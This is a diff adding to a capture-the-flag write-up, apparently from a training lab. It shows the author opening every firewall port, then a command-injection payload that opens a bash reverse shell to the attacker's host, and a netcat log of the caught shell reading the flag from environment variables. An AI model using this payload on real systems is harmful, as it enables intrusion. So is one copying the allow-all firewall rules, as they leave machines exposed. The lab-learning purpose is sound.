@@ -266,6 +266,122 @@ flag{7da6c7debd40bd611560c13d8149b647}
 
 it works, maybe need to fix my machine 😔 
 
+solve it fixing my iptables and ufw I was blocking smb 🤣
+
+┌──(kali㉿kali)-[~]
+└─$ sudo ufw status
+[sudo] password for kali: 
+Status: active
+
+To                         Action      From
+--                         ------      ----
+80                         ALLOW       Anywhere                  
+22                         ALLOW       Anywhere                  
+23                         ALLOW       Anywhere                  
+145                        ALLOW       Anywhere                  
+445                        ALLOW       Anywhere                  
+139                        ALLOW       Anywhere                  
+138                        ALLOW       Anywhere                  
+137                        ALLOW       Anywhere                  
+4444                       ALLOW       Anywhere                  
+1337                       ALLOW       Anywhere                  
+8080                       ALLOW       Anywhere                  
+443                        ALLOW       Anywhere                  
+1:65535/tcp                ALLOW       Anywhere                  
+80 (v6)                    ALLOW       Anywhere (v6)             
+22 (v6)                    ALLOW       Anywhere (v6)             
+23 (v6)                    ALLOW       Anywhere (v6)             
+145 (v6)                   ALLOW       Anywhere (v6)             
+445 (v6)                   ALLOW       Anywhere (v6)             
+139 (v6)                   ALLOW       Anywhere (v6)             
+138 (v6)                   ALLOW       Anywhere (v6)             
+137 (v6)                   ALLOW       Anywhere (v6)             
+4444 (v6)                  ALLOW       Anywhere (v6)             
+1337 (v6)                  ALLOW       Anywhere (v6)             
+8080 (v6)                  ALLOW       Anywhere (v6)             
+443 (v6)                   ALLOW       Anywhere (v6)             
+1:65535/tcp (v6)           ALLOW       Anywhere (v6)   
+
+using a range from 1 to 65535 max port scanning through rustscan, now testing printnightmare :)
+
+sudo ufw allow 1:65535/tcp
+
+
+┌──(kali㉿kali)-[~]
+└─$ sudo iptables -L                
+Chain INPUT (policy DROP)
+target     prot opt source               destination         
+ufw-before-logging-input  all  --  anywhere             anywhere            
+ufw-before-input  all  --  anywhere             anywhere            
+ufw-after-input  all  --  anywhere             anywhere            
+ufw-after-logging-input  all  --  anywhere             anywhere            
+ufw-reject-input  all  --  anywhere             anywhere            
+ufw-track-input  all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
+ACCEPT     all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere            
+
+Chain FORWARD (policy DROP)
+target     prot opt source               destination         
+DOCKER-USER  all  --  anywhere             anywhere            
+DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
+DOCKER     all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
+DOCKER     all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere            
+ufw-before-logging-forward  all  --  anywhere             anywhere            
+ufw-before-forward  all  --  anywhere             anywhere            
+ufw-after-forward  all  --  anywhere             anywhere            
+ufw-after-logging-forward  all  --  anywhere             anywhere            
+ufw-reject-forward  all  --  anywhere             anywhere            
+ufw-track-forward  all  --  anywhere             anywhere            
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+ufw-before-logging-output  all  --  anywhere             anywhere            
+ufw-before-output  all  --  anywhere             anywhere            
+ufw-after-output  all  --  anywhere             anywhere            
+ufw-after-logging-output  all  --  anywhere             anywhere            
+ufw-reject-output  all  --  anywhere             anywhere            
+ufw-track-output  all  --  anywhere             anywhere            
+ACCEPT     all  --  anywhere             anywhere      
+
+sudo iptables -A INPUT -j ACCEPT
+sudo iptables -A OUTPUT -j ACCEPT
+
+; bash -i >& /dev/tcp/10.8.19.103/4443 0>&1
+
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -nlvp 4443
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4443
+Ncat: Listening on 0.0.0.0:4443
+Ncat: Connection from 10.10.175.160.
+Ncat: Connection from 10.10.175.160:51852.
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+challenge@e7c1352e71ec:~$ whoami
+whoami
+challenge
+challenge@e7c1352e71ec:~$ env
+env
+HOSTNAME=e7c1352e71ec
+PWD=/home/challenge
+HOME=/home/challenge
+LS_COLORS=
+GOLANG_VERSION=1.15.7
+FLAG=flag{7da6c7debd40bd611560c13d8149b647}
+SHLVL=2
+PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+challenge@e7c1352e71ec:~$ echo $FLAG
+echo $FLAG
+flag{7da6c7debd40bd611560c13d8149b647}
+
 
 ```
 
